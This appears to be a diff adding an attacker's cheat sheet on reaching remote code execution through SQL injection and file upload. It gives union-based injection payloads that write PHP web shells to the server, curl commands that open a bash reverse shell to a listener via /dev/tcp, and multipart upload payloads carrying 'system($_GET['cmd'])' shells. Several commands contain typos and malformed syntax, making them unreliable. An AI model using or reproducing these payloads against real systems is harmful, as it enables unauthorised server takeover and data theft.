@@ -1,0 +1,109 @@
+Different type Of RCE attacks:
+-> From Sqli to RCE
+-> From Disclosure to RCE
+-> RCE via file upload Vulnerability
+-> RCE via Deserialization
+
+** Common SQLI:
+
+1. Use '
+2. Fixed By -,--+-,--+,-- -
+3. Used order by 1 [union based > column Count > Order By]
+4. Used union all Select [union based > union stagment > union all select]
+5. Used database name One Shot [Union Based > database > database name one shot]
+6. Used TableName One Shot [Union Based > table > table Name One shot]
+7. Used ColumnBase One Shot [Union Based > Column > columnBased One Shot]
+8. Used data One Shot [Union Based > data > data One Shot]
+
+Union Based - Get Based:
+01. use \ and try to use balancer
+02. use +order+by+ for finding how many column
+03. use +union+all+select for finding vulnerable table number 
+04. for find database use database() and find user() where is vulnerable table number
+05. for find full database use "Union Base > Database > Database Name group contact"
+06. for find full tables use "Union base > table > Table Name group contact"
+07. For find full Columns use "Union base > columns > Column Name group Concat"
+08. For find full data use "Union base > data > data group contact"
+
+-> From Sqli to RCE:
+
+Common shell : Common Cmd command and shells.txt
+
+-> Method 01:
+" or 1=1 --
+" union select null, null, null -- 
+" union select null, null, null -- 
+" union select null, "<?php system($_GET['cmd']); ?>", null info outline "/var/www/html/shell.php" --
+Triggure Command : http://victim-website.com/shell.php?cmd=whoami
+
+-> Method 02:
+https://10.10.10.10/room.php?id=1 order by 7
+https://10.10.10.10/room.php?id=1 union select 1,2,3,4,5,6,7
+https://10.10.10.10/room.php?id=1 union select 1,2,user(),4,5,6,7
+https://10.10.10.10/room.php?id=1 union select 1,2,'<?php system($_REQUEST['exec']); ?>',4,5,6,7 into outfile '/var/www/html/exec.php'
+curl -X POST http://10.10.10.10/exec.php --data-urlencode exec=id
+curl -X POST "http://10.10.10.10/exec.php" --data-encode 'exec=bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"'
+nc -nvlp 4444
+
+-> Method 03:
+https://10.10.10.10/room.php?id=1 order by 7
+https://10.10.10.10/room.php?id=1 union select 1,2,3,4,5,6,7
+https://10.10.10.10/room.php?id=1 union select 1,2,user(),4,5,6,7
+https://10.10.10.10/room.php?id=1 union select 1,2,'<?php system($_GET['cmd']); ?>',4,5,6,7 into outfile '/var/www/html/exec.php'
+curl -X GET http://10.10.10.10/exec.php cmd=id
+curl -X GET "http://10.10.10.10/exec.php?exec=bash+-c+'bash+-i+%3E%26+/dev/tcp/10.10.10.10/4444+0%3E%261'"
+nc -nvlp 4444
+
+https://10.10.10.10/room.php?id=1 union select 1,2,'echo THIS IS D0LPH1N',4,5,6,7 into outfile '/var/www/html/hacked.txt'
+
+RCE Via Image File Upload:
+
+** Validate FIle Extention
+** Validate MIME Type
+** Check Content Type Headers
+** Use Content Scanning and Filtering
+
+-> First You can add Comment in Image. like Comment : <?>=$_GET[x]?>
+-> Then use jhead name.jpg
+-> Then try to upload or bypass upload 
+-> If you can bypass thats good 
+Execute Command : https://abc.com/name.php?x=
+
+-> First upload php file and then try to execute https://abc.com/name.php?x=
+
+-> First, if you see that there is a form but no uploader option, just fill out the form and submit it. After submitting, paste this code and check the response.
+Content-Disposition: form-data; name="rce.php"; filename="attacker.php"
+Content-type: application/x-php
+<?php
+system($_GET["cmd"]);
+?>
+
+/themes/abc/assets/rce.php?cmd=whoami
+/themes/abc/assets/rce.php?cmd=ls
+/themes/abc/assets/rce.php?cmd=cat+rce.php
+
+
+<?php system($_GET['cmd']); ?> ||||| https://www.abc.xyz/cmd.php?cmd=
+<?php system($_GET['id']); ?>  ||||| https://www.abc.xyz/id.php?id=
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
